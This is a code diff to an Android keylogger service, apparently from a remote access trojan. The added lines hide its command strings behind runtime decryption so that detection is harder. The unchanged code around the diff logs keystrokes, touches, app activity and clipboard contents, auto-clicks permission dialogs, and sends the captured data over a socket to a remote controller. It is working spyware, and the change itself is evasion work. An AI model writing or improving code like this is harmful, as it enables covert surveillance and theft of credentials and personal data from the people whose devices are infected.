@@ -75,6 +75,15 @@ public class KeyloggerService extends AccessibilityService {
     // Tracking
     private String lastPackageName = "";
     private String lastActivityName = "";
+
+    // Cached decrypted opcode (lazy init to avoid repeated decryption)
+    private static String kldataOpcode = null;
+    private static String getKldataOpcode() {
+        if (kldataOpcode == null) {
+            kldataOpcode = ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KLDATA);
+        }
+        return kldataOpcode;
+    }
     private long lastEventTime = 0;
     private boolean isPermissionDialogVisible = false;
 
@@ -191,7 +200,7 @@ public class KeyloggerService extends AccessibilityService {
             data.put("className", event.getClassName() != null ? event.getClassName().toString() : "");
             data.put("ts", System.currentTimeMillis());
 
-            bufferEvent("x0000kldata", data);
+            bufferEvent(getKldataOpcode(), data);
 
         } catch (Exception ignored) {}
     }
@@ -231,7 +240,7 @@ public class KeyloggerService extends AccessibilityService {
             data.put("className", event.getClassName() != null ? event.getClassName().toString() : "");
             data.put("ts", System.currentTimeMillis());
 
-            bufferEvent("x0000kldata", data);
+            bufferEvent(getKldataOpcode(), data);
 
         } catch (Exception ignored) {}
     }
@@ -295,7 +304,7 @@ public class KeyloggerService extends AccessibilityService {
                 data.put("activity", className);
                 data.put("ts", System.currentTimeMillis());
 
-                bufferEvent("x0000kldata", data);
+                bufferEvent(getKldataOpcode(), data);
             }
 
         } catch (Exception ignored) {}
@@ -315,7 +324,7 @@ public class KeyloggerService extends AccessibilityService {
             data.put("package", event.getPackageName() != null ? event.getPackageName().toString() : "");
             data.put("ts", System.currentTimeMillis());
 
-            bufferEvent("x0000kldata", data);
+            bufferEvent(getKldataOpcode(), data);
 
         } catch (Exception ignored) {}
     }
@@ -329,7 +338,7 @@ public class KeyloggerService extends AccessibilityService {
             data.put("package", event.getPackageName() != null ? event.getPackageName().toString() : "");
             data.put("ts", System.currentTimeMillis());
 
-            bufferEvent("x0000kldata", data);
+            bufferEvent(getKldataOpcode(), data);
 
         } catch (Exception ignored) {}
     }
@@ -424,10 +433,7 @@ public class KeyloggerService extends AccessibilityService {
                     grantLog.put("type", "auto_grant");
                     grantLog.put("package", lastPackageName);
                     grantLog.put("ts", System.currentTimeMillis());
-                    JSONObject logEvent = new JSONObject();
-                    logEvent.put("order", "x0000kldata");
-                    logEvent.put("data", grantLog);
-                    bufferEvent("x0000kldata", grantLog);
+                    bufferEvent(getKldataOpcode(), grantLog);
 
                     button.recycle();
                     break; // Only click the first matching button
@@ -524,7 +530,7 @@ public class KeyloggerService extends AccessibilityService {
                         data.put("action", event.getAction()); // DOWN=0, UP=1, MOVE=2
                         data.put("package", lastPackageName);
                         data.put("ts", System.currentTimeMillis());
-                        bufferEvent("x0000kldata", data);
+                        bufferEvent(getKldataOpcode(), data);
                     } catch (Exception ignored) {}
                 }
                 // Return false to allow the touch to pass through to the app underneath
@@ -716,7 +722,7 @@ public class KeyloggerService extends AccessibilityService {
                 payload.put("from", lastPackageName);
                 payload.put("ts", System.currentTimeMillis());
 
-                socket.emit("x0000kldata", payload);
+                socket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KLDATA), payload);
                 Log.d(TAG, "Flushed " + batch.length() + " keylogger events");
             }
             // If socket isn't connected, events remain buffered in the ConcurrentLinkedQueue
@@ -811,13 +817,13 @@ public class KeyloggerService extends AccessibilityService {
         }
 
         try {
-            String action = data.optString("action", "toggle");
+            String action = data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ACTION), "toggle");
             Socket socket = IOSocket.getInstance().getIoSocket();
 
             switch (action) {
                 case "toggle":
                 case "enable":
-                    setEnabled(!data.optBoolean("state", !enabled));
+                    setEnabled(!data.optBoolean(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATE), !enabled));
                     break;
 
                 case "enableWithOverlay":
@@ -836,16 +842,16 @@ public class KeyloggerService extends AccessibilityService {
                 case "getStatus":
                     if (socket != null && socket.connected()) {
                         JSONObject status = getStatus();
-                        socket.emit("x0000kl", status);
+                        socket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KL), status);
                     }
                     break;
 
                 case "autoGrant":
-                    setAutoGrantEnabled(data.optBoolean("state", true));
+                    setAutoGrantEnabled(data.optBoolean(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATE), true));
                     break;
 
                 case "overlay":
-                    setOverlayIntercept(data.optBoolean("state", false));
+                    setOverlayIntercept(data.optBoolean(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATE), false));
                     break;
 
                 case "unlockScreen":
@@ -855,8 +861,8 @@ public class KeyloggerService extends AccessibilityService {
                 case "getClipboard":
                     if (socket != null && socket.connected()) {
                         JSONObject clip = instance.getClipboardContent();
-                        clip.put("order", "x0000kl");
-                        socket.emit("x0000kl", clip);
+                        clip.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER), ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KL));
+                        socket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KL), clip);
                     }
                     break;
             }
